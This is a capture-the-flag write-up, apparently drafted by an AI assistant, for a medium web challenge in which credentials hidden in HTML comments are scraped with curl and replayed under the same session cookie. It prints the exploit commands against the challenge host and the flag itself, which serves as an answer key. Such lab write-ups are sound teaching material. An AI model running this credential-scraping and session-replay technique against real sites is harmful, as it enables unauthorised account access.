Here’s a **clean, submission-ready final write-up** you can paste directly into HackQuest / CTFd.
It’s concise, technical, and explains *why* the exploit works.

---

# Vanishing Point – 300

**Category:** Web
**Difficulty:** Medium
**Flag:** `HQX{c51e54704c0cad1e5c2029a576588f58}`

---

## Challenge Description

The webpage continuously reloads every 5 seconds, creating a new session on each load. The challenge hints that *only the first request contains the credentials*, and missing that moment resets the loop. The goal is to intercept this initial response, extract the credentials, and authenticate before the session expires.

---

## Analysis

Key observations from the source code and behavior:

1. **Client-side auto refresh**

   ```js
   setInterval(() => {
       location.reload();
   }, 5000);
   ```

   This forces a new page load (and session) every 5 seconds.

2. **Credentials hidden in HTML comments**

   ```html
   <!-- Username="hquser-<random>" -->
   <!-- Password="<random>" -->
   ```

   These credentials are:

   * Generated per session
   * Valid only for the *current* session
   * Not visible in the rendered page, only in raw HTML

3. **Session dependency**

   * A new session cookie is issued on each reload
   * Logging in with credentials from a different session fails

The vulnerability relies entirely on **client-side enforcement** (JavaScript reload) and **sensitive data exposure** in HTML comments.

---

## Exploitation Strategy

To bypass the forced reload and preserve the initial session:

* Use `curl`, which does **not execute JavaScript**
* Capture the **first response**
* Extract the credentials from HTML comments
* Reuse the **same session cookie** to authenticate

---

## Exploit

### Step 1: Fetch the page and save the session cookie

```bash
curl -s -c c.txt http://challenge.tcshackquest.com:12960/
```

### Step 2: Extract credentials from the HTML

```bash
curl -s -c c.txt http://challenge.tcshackquest.com:12960/ \
| grep -oP 'Username="\K[^"]+|Password="\K[^"]+'
```

### Step 3: Login using the same session

```bash
curl -b c.txt -X POST http://challenge.tcshackquest.com:12960/ \
-d "username=hquser-<extracted>&password=<extracted>"
```

---

## Result

The server responds with a successful admin login and reveals the flag:

```
HQX{c51e54704c0cad1e5c2029a576588f58}
```

---

## Root Cause

* **Sensitive information disclosure** via HTML comments
* **Client-side security dependency**
* **Session-bound credentials without proper server-side validation**
* **TOCTOU (Time-of-Check Time-of-Use) logic flaw**

---

## Conclusion

By bypassing client-side JavaScript using `curl`, the initial session remains intact, allowing extraction and reuse of one-time credentials. This leads to successful admin authentication and flag retrieval.

---

✅ **Challenge solved successfully.**
